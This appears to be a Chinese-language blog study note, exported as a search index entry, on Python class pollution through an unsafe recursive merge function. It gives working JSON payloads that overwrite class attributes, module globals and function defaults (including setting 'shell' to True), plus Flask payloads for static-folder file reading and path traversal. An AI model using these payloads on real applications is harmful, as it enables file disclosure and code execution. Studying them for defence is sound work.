<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>原型链-1</title>
    <link href="/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/"/>
    <url>/2025/10/16/%E5%8E%9F%E5%9E%8B%E9%93%BE-1/</url>
    
    <content type="html"><![CDATA[<h3 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h3><ul><li>根本原理和Nodejs原型链污染的根本原理相同，只不过<code>Nodejs</code>是<em><strong>对键值对的控制</strong></em>来进行污染，而<code>python</code>则是<em><strong>对类属性值的污染</strong></em>，且<strong>只能对类的属性进行污染</strong>而<strong>不能污染类的方法</strong></li></ul><h4 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<span class="hljs-comment"># 提取键值。为什么要items()？因为直接src只能得到键，而不能得到值，for k, v in ... 这种语法是 Python 的序列解包 (Sequence Unpacking)。它期望 `in` 后面的对象每次迭代时都能提供一个包含两个元素的序列（比如元组或列表）。</span><br><span class="hljs-comment"># 因此，`(键, 值)` 这种元组形式恰好能被 `k, v` 完美地解包，`k` 对应键，`v` 对应值</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br><span class="hljs-comment"># hasattr(object,name):判断对象是否包含对应的属性。这里是在检查 dst 是否定义了 __getitem__ 方法，检查其是否支持通过[]来访问成员</span><br><span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<span class="hljs-comment"># 如果存在dst中k键且v为字典</span><br>merge(v,dst.get(k))<span class="hljs-comment"># 递归调用 merge ，将src中的子字典合并到dst对应的子字典(dst.get(k))中</span><br><span class="hljs-keyword">else</span>:<br>dst[k] = v <span class="hljs-comment"># 赋值或覆盖</span><br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<span class="hljs-comment"># 为什么不能给k键直接赋值一个字典呢？这是为了实现深层合并而不是浅层覆盖，从而避免丢失嵌套的有效信息。而且如果是直接赋值的话肯定就污染不了了。比如同名字典中还有其它键，直接复制就会被覆盖了</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">setattr</span>(dst,k,v)<br></code></pre></td></tr></table></figure><h4 id="污染示例"><a href="#污染示例" class="headerlink" title="污染示例"></a>污染示例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<span class="hljs-comment"># 指向该实例的原型对象</span><br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<span class="hljs-comment"># 父类</span><br>            <span class="hljs-string">&quot;secret&quot;</span> : <span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#hello</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#hello</span><br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-comment">#world</span><br><span class="hljs-built_in">print</span>(instance.secret)<br><span class="hljs-comment">#world</span><br><br>POST提交<br>Content-<span class="hljs-type">Type</span>: application/json<br></code></pre></td></tr></table></figure><h3 id="获取全局变量污染"><a href="#获取全局变量污染" class="headerlink" title="获取全局变量污染"></a>获取全局变量污染</h3><ul><li><code>__init__</code>作为一个类的内置方法，在<strong>没有被重写为函数</strong>的时候，其<em>数据类型</em>会被当作<em><strong>装饰器</strong></em></li><li><em><strong>装饰器的特点</strong></em>：<em><strong>都</strong></em>具有一个<strong>全局属性</strong><code>__globals__</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> :<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(demo.__globals__)<br><span class="hljs-comment"># 等同于 </span><br><span class="hljs-built_in">globals</span>() <br><span class="hljs-comment"># 等同于</span><br>A.__init__.__globals__<br>instance = A()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>            <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-comment"># 声明的类也是一个全局属性</span><br>                <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-number">5</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br>merge(payload, instance)<br><span class="hljs-built_in">print</span>(B.name)<br><span class="hljs-built_in">print</span>(a)<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="污染加载的其它模块"><a href="#污染加载的其它模块" class="headerlink" title="污染加载的其它模块"></a>污染加载的其它模块</h3><ul><li>在可以操控全局变量的情况下，我们能对入口文件的<em><strong>类对象或属性</strong></em>进行操作</li><li>如果目标对象不在入口文件中，就需要对其它加载过的模块来获取了</li></ul><h4 id="import加载污染"><a href="#import加载污染" class="headerlink" title="import加载污染"></a>import加载污染</h4><ul><li><code>import</code>入口文件同级下的目录<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> demo<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">##demo.py</span><br>a = <span class="hljs-number">1</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>:<br>    classa = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="sys加载污染"><a href="#sys加载污染" class="headerlink" title="sys加载污染"></a>sys加载污染</h4><ul><li>引用第三方模块或内置模块的环境</li><li>这时候就要借助<code>sys</code>模块中的<code>module</code>属性<ul><li>该属性能加载出<em><strong>自运行开始所有已加载的模块</strong></em><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;demo&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">4</span>,<br>                        <span class="hljs-string">&quot;B&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;classa&quot;</span>:<span class="hljs-number">5</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="加载器loader污染"><a href="#加载器loader污染" class="headerlink" title="加载器loader污染"></a>加载器loader污染</h4><ul><li><code>sys</code>模块不是都有导入的，这时候就能借助<code>loader</code></li><li><code>loader</code>加载器是python为了<strong>实现模块加载</strong>而设计的类，其在<code>importlilb</code>这一内置模块中有具体实现</li><li>且<code>importlib</code>模块下的所有<code>py</code>文件都引入了<code>sys</code>模块</li><li>这样就能通过<code>&lt;模块名&gt;.__loader__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 获取模块的loader</span><br>loader = math.__loader__<br><span class="hljs-comment"># 即 math 模块的 __loader__ 属性包含了一个 loader 对象，负责加载 math 模块</span><br><span class="hljs-comment"># 打印loader信息</span><br><span class="hljs-built_in">print</span>(loader)<br></code></pre></td></tr></table></figure></li></ul><h4 id="spec-污染"><a href="#spec-污染" class="headerlink" title="__spec__污染"></a><code>__spec__</code>污染</h4><ul><li>其包含了关于类加载时候的信息，定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>中</li><li>因此可以以<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>来获取<code>sys</code>模块</li></ul><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><ul><li><code>__defaults__</code>：python中的一个内置元组，用于存储<strong>方法形参的默认参数值</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">var_1, var_2 =<span class="hljs-number">2</span>, var_3 = <span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(a.__defaults__)<br><span class="hljs-comment">#(2, 3)</span><br></code></pre></td></tr></table></figure></li><li>因此可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__defaults__&quot;</span> : (<span class="hljs-literal">True</span>,)<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><code>__kwdefaults__</code>是以字典形式来进行收录：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;demo&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;__kwdefaults__&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;shell&quot;</span> : <span class="hljs-literal">True</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="flask的app关键属性"><a href="#flask的app关键属性" class="headerlink" title="flask的app关键属性"></a>flask的app关键属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">app = Flask(__name__)<br><br><span class="hljs-comment"># _got_first_request:判断某次请求是否为flask启动后的第一次请求，返回布尔值，会影响装饰器:</span><br><span class="hljs-comment">## app.before_first_request 的调用</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># _static_url_path:被指定的static静态目录路径，污染后可实现重定向以获取其它文件下的信息</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 在 flask 应用下访问 GET /../XXX 一般都会报错500，在 temlating.py 模块下发生</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> INTERNAL SERVER ERROR<br><span class="hljs-comment">## 这是一个在模板渲染的时候为了防止目录穿梭进行的操作</span><br><span class="hljs-comment">## 使用 os.path.pairdir 来检验，其值为 .. </span><br><span class="hljs-comment">## 这个污染的是os模块下的吗？？？如果是的话为什么能污染到那？是因为是内置模块？</span><br><span class="hljs-comment">### 是因为 os 被 import 导入了</span><br><span class="hljs-comment">## 将其修改为任意值就能进行穿梭了</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># `Flask.jinja_env.variable_start_string = &quot;xxx&quot;`</span><br><span class="hljs-comment">## 实现对`Jinja`语法标识符进行替换，这里把 &#123;&#123; 换成了 [[</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;jinja_env&quot;</span> :&#123;<br><span class="hljs-string">&quot;variable_start_string&quot;</span> : <span class="hljs-string">&quot;[[&quot;</span>,<span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>&#125;        <br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">### 需要先污染再访问模板，因为会有缓存</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
